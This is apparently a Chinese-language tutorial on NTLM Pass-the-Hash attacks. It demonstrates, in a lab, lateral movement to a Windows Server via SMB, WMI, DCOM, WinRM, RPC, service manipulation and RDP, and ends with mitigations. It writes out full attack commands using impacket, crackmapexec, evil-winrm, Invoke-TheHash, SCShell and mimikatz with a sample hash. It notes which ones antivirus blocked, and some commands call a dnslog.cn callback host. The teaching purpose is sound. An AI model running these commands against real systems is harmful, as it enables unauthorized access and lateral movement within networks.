0x00 NTLM认证：

NTLM是指telnet的一种验证身份方式，即问询/应答身份验证协议，其主要认证过程粗略地分为三步：协商、质询、验证

  1. Client向Server端发送用户信息(用户名)请求，Server接收到Client发送的用户名后，判断本地账户列表是否有该用户名；如果没有，返回认证失败，如果有，生成Chanllenge，并且从本地查找用户对应的NTLM Hash，使用NTLM Hash加密Chanllenge，生成一个Net-NTLM Hash存在内存中，并将Chanllenge发送给Client。

  2. Client接收到Chanllenge后，将自己提供的用户密码转换为NTLM Hash，使用NTLM Hash加密Chanllenge， 这个结果叫Response，表现形式是Net-NTLM Hash，最后将Response发送给Server。

  3. Server接收到Client发送的Response，将Response与之前的Net-NTLM Hash进行比较，如果相等，则认证通过。


0x01 PTH 原理


NTLM认证不使用明文口令，而是使用经过系统API(例如LsaLogonUser)加密后的hash值；

如果获得了NTLM hash值，我们就能够对远程系统进行身份验证并模拟该用户。


哈希传递攻击利用了身份验证协议中的一种实现缺陷，即每次会话之间的密码散列保持静态，直到下次更改密码为止。


0x02 PTH 操作演示


哈希传递只是一种无明文认证的手段，我们还需要针对具体的服务进行攻击。


目标主机：Windows Server 2012 R2

攻击机器：Kali

防护情况




SMB

SMB协议支持直接运行在TCP上或封装运行在NetBIOS协议上，这里利用的SMB协议是直接运行在TCP上；常规情况下我们可以使用metasploit的PsExec模块、Pass-the-Hash toolkit中的pth-winexe和pth-rpcclient等工具，不建议使用微软Sysinternals Suite套件中的psexec。


1. 首先尝试使用crackmapexec中SMB模块调用powershell或cmd远程执行命令时发现被360拦截。

crackmapexec smb 192.168.163.161 -u base -H de26cce0356891a4a020e7c4957afc72 -x whoami

2. 其次尝试使用impacket中smbexec.py可以正常反弹shell，当执行命令时会在C:\Windows\Temp目录下生成execute批处理文件并运行，这时发现被360拦截

python3 smbexec.py  -hashes 00000000000000000000000000000000:92937945b518814341de3f726500d4ff administrator@192.168.163.161

3. 最后尝试使用Invoke-TheHash中Invoke-SMBExec.ps1脚本，发现未被防护软件拦截（可能是虚拟机环境原因）。

Invoke-SMBExec -Target 192.168.163.161 -Username administrator -Hash 92937945b518814341de3f726500d4ff -Command "ping xxx.dnslog.cn"


4. 特殊情况下，如果只有SMB文件共享权限，没有远程执行权限，可以使用SMB客户端连接。

python3 smbclient.py -hashes 00000000000000000000000000000000:92937945b518814341de3f726500d4ff administrator@192.168.163.161


WMI

WMI是微软的一套管理规范，整合了windows网络中设备和应用程序的管理。WMI为用户提供了基本信息，并且让用户有权限执行各种管理任务。由于这种权限是通过身份认证来实现的，假如我们获取了凭证，就可以执行pth攻击来通过身份认证。


这里使用的是Invoke-TheHash中Invoke-WMIExec.ps1脚本，防护软件未拦截。

Invoke-WMIExec -target 192.168.163.161 -username administrator -hash 92937945b518814341de3f726500d4ff -command "ping sgbq8d.dnslog.cn"


WMIC扩展WMI（Windows Management Instrumentation，Windows管理工具），提供了从命令行接口和批命令脚本执行系统管理的支持。


这里使用kali中内置的pth-wmic程序，能执行一些WMI命令。

pth-wmic -U administrator%00000000000000000000000000000000:92937945b518814341de3f726500d4ff //192.168.163.161 "select Name from Win32_UserAccount"


DCOM

Distributed COM（全称Distributed Component Object Model，缩写DCOM）是微软的COM规格的网络化版本，又可以称Network OLE，DCOM允许COM组件可以利用网络来传输资料，并且它是以二进制格式来传输。


这里使用impacket中dcomexec.py脚本利用各种DCOM端点（例如MMC20.Application，ShellWindows或ShellBrowserWindow对象）在远程系统上生成半交互式Shell。 

python3 dcomexec.py -hashes 00000000000000000000000000000000:92937945b518814341de3f726500d4ff administrator@192.168.163.161 whoami


WinRM

Windows远程管理（WinRM）是Windows Server 2003 R2、Windows Vista和Windows Server 2008中一种新式的方便远程管理的服务。WinRS（Windows远程Shell）是WinRM的“客户端”，它在远程管理WinRM服务器的计算机上运行，并且使用一组不同的端口。WinRM使用5985端口(HTTP)或者5986(HTTPS)。


1. 使用Windows自带的管理软件执行命令会被360拦截。

2.如果SMB没有对外开放，或者被某些防护软件拦截，这时可以使用CrackMapExec、evil-winrm等工具基于WinRM远程访问目标服务器。

crackmapexec winrm 192.168.163.161 -u administrator -H 92937945b518814341de3f726500d4ff -X "whoami"

evil-winrm -i 192.168.163.161 -u administrator -H 92937945b518814341de3f726500d4ff


RPC

RPC也就是远程过程调用，它是一种协议，应用程序可以通过RPC来调用网络中其他远程系统上的特定服务。如果能在认证过程中传递hash值，我们就能从目标服务器上获取基本的终端信息。


1. kali系统pth工具包中有一个针对RPC协议的攻击方法，它可以返回一个交互式会话，能够执行一些RPC命令。可以使用这些RPC命令收集关于网络和其他一些信息的。

pth-rpcclient -U administrator%00000000000000000000000000000000:92937945b518814341de3f726500d4ff //192.168.163.161


2. kali中内置pth-net工具也可以通过RPC协议来执行一些任务。

pth-net rpc info -U administrator%00000000000000000000000000000000:92937945b518814341de3f726500d4ff -I 192.168.163.161

Services

Windows服务扩展是基于Microsoft管理控制台提供的一个组件，它可以连接到本地计算机或网络上的远程计算机。


    这里使用impacket中services.py脚本通过MSRPC接口操作Windows服务。它可以启动，停止，删除，读取状态，配置，列出，创建和更改任何服务。

    1. 查看服务列表

python3 services.py -hashes 00000000000000000000000000000000:92937945b518814341de3f726500d4ff administrator@192.168.163.161 list

    2. 创建计算器进程

python3 services.py -hashes 00000000000000000000000000000000:92937945b518814341de3f726500d4ff administrator@192.168.163.161 create  -path C:\Windows\System32\calc.exe  -name calc -display calc

    3. SCShell是无文件横向移动工具，它依赖ChangeServiceConfigA来运行命令。该工具的优点在于它不会针对SMB执行身份验证，通过DCERPC执行，无需创建服务，而只需通过ChangeServiceConfigAAPI 远程打开服务并修改二进制路径名即可（所以要事先知道目标上未启动的服务名称，可以采用通用的例如卷影服务vss、XblAuthManager、defragsvc、msbuild、Netlogon等等）。

        这里使用SCShell通过defragsvc服务远程执行命令，结果是没有回显的。

python3 scshell.py administrator@192.168.163.161 -hashes 000000000000000000000000000000:92937945b518814341de3f726500d4ff -service-name defragsvc

    执行时发现火绒会拦截远程服务创建


RDP


    1. 在渗透测试期间，有时需要访问目标系统上只能通过图形化界面使用的软件，如果无法使用明文密码通过远程桌面登录，这时可以传递无法无法破解的NTLM hash已该用户身份访问系统。


xfreerdp /v:192.168.163.161 /u:Administrator /pth:92937945b518814341de3f726500d4ff


    2. 本地测试时未对Windows Server 2012 R2做任何更改，使用SID非500的管理员组普通用户发现同样可以登录远程桌面；实战中如果遇到不能登录，可能需要在目标系统启用“受限管理模式”：

reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

    3. Windows下则可以使用mimikatz辅助登录

privilege::debugsekurlsa::pth /user:administrator /domain:. /ntlm:xxxxxx "/run:mstsc.exe /restrictedadmin"

0x04 缓解措施：

微软在Windows 10 v1607中将加密算法从RC4替换为AES，如果使用未更新加密算法的程序提取到的NTLM hash是错误的。



以下措施主要是防范哈希被读取

  1. 启用Microsoft的Windows Defender凭据保护。

    1. Credential Guard在Windows 10 和Windows Server 2016中引入，建立在虚拟化之上，可保护凭据存储并仅允许受信任的进程访问它们。在Windows 10企业版中默认开启。

  1. 局限性

    1. Windows Defender Credential Guard并不能保护本地SAM数据库。

  2. 不允许本地帐户通过网络进行身份验证。

    1. 可能会影响用户正常操作。

    2. Windows 8.1和Windows 2012R2中添加了两个新的SID S，并且可以在组策略中用于此目的。S-1-5-113将适用于任何本地帐户，而SID S-1-5-114将适用于也是本地Administrators组成员的任何本地帐户。

    3. 局限性

  3. 使用Microsoft本地管理员密码解决方案(LAPS)之类的解决方案随机存储本地管理员密码。

    1. 将本地管理员密码存储在LDAP上，作为计算机账户的一个机密属性，配合GPO，实现自动定期修改密码、设置密码长度、强度等，此防御措施确保了定期更改本地管理员密码。

    2. 如果配置不当，任何用户都可以修改此策略，查看用户密码。

  4. 将特权域帐户添加到受保护的用户组，以减少凭据被盗的风险。

    1. 受保护的用户组是一个域安全组，仅能在域中保护用户，阻止用户Hash被读取。

    2. 通过注册表Cache、钓鱼攻击等方式仍可能获取域用户凭据。

    3. 受保护用户是一个新的域全局安全组，对于该组的成员，Windows 8.1设备或Windows Server 2012 R2主机不会缓存受保护用户不支持的凭据。

    4. 局限性
